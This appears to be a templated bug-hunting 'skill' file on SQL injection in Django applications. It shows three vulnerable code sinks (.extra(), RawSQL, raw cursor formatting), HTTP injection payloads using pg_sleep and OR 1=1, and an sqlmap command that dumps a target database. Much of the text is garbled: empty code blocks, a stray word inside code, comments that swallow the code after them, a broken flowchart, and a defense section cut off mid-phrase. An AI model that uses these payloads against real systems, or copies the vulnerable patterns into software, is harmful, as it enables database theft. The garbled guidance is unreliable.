---
name: django-sql-injection
description: >
  Identify and exploit SQL Injection vulnerabilities in Django applications, specifically focusing 
  on edge cases involving raw querysets (`RawSQL`), improper use of `.extra()`, and poorly sanitized 
  filters where Django's typical ORM protections are bypassed.
domain: cybersecurity
subdomain: bug-hunting
category: Web Vulnerabilities
difficulty: intermediate
estimated_time: "2-4 hours"
mitre_attack:
  tactics: [TA0001, TA0006]
  techniques: [T1190, T1059]
platforms: [web, python]
tags: [sql-injection, django, python, web-security, databases, bug-hunting]
tools: [burp-suite, sqlmap, python]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Django SQL Injection

## When to Use
- When auditing or penetration testing a web application built on the Django framework (often identifiable by specific session cookies, admin panels, or error pages).
- To exploit areas where developers have strayed from the safe, built-in ORM features and opted for raw SQL execution or complex, unsafe query annotations.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Understanding Django ORM Limitations

```text
# Concept: ```

### Phase 2: Identifying Sinks (Code Review / Black Box)

```python
# Sink 1: The `.extra()` method VULNERABLE tastefully order_by = request.GET.get('order_by')
users = User.objects.extra(order_by=[order_by])

# Sink 2: RawSQL VULNERABLE from django.db.models.expressions import RawSQL
search = request.GET.get('search')
products = Product.objects.annotate(val=RawSQL(f"select count(*) from app_product where name = '{search}'", []))

# Sink 3: from django.db import connection
def custom_query(request):
    user_input = request.GET.get('username')
    with connection.cursor() as cursor:
        cursor.execute("SELECT * FROM users WHERE username = '%s'" % user_input) # VULNERABLE ```

### Phase 3: Exploitation

```http
# GET /products?order_by=-id%3B%20SELECT%20pg_sleep(10)-- HTTP/1.1
Host: django-app.local

# GET /search?search=' OR 1=1; SELECT pg_sleep(5);-- HTTP/1.1
```

### Phase 4: Data Exfiltration (Time-Based)

```bash
# sqlmap -u "http://target.com/products?order_by=id" -p order_by --technique=T --dbms=postgresql --dump
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Analyze Request ] --> B{ORMs Bypsassed ]}
    B -->|Yes| C[Test Error ]
    B -->|No| D[Test Raw ]
    C --> E[Exploit ]
```


## 🔵 Blue Team Detection & Defense
- **Strict ORM Usage**: **Input Validation**: Key Concepts
| Concept | Description |
|---------|-------------|
| `.extra()` | |


## Output Format
```
Django Sql Injection — Assessment Report
============================================================
Target: [Target identifier]
Assessor: [Operator name]
Date: [Assessment date]
Scope: [Authorized scope]
MITRE ATT&CK: [Relevant technique IDs]

Findings Summary:
  [Finding 1]: [Severity] — [Brief description]
  [Finding 2]: [Severity] — [Brief description]

Detailed Results:
  Phase 1: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

  Phase 2: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

Risk Rating: [Critical/High/Medium/Low/Informational]
Recommendations:
  1. [Immediate remediation step]
  2. [Long-term hardening measure]
  3. [Monitoring/detection improvement]
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- Django Documentation: [Security in Django - SQL Injection](https://docs.djangoproject.com/en/stable/topics/security/#sql-injection-protection)
- PortSwigger: [SQL Injection](https://portswigger.net/web-security/sql-injection)
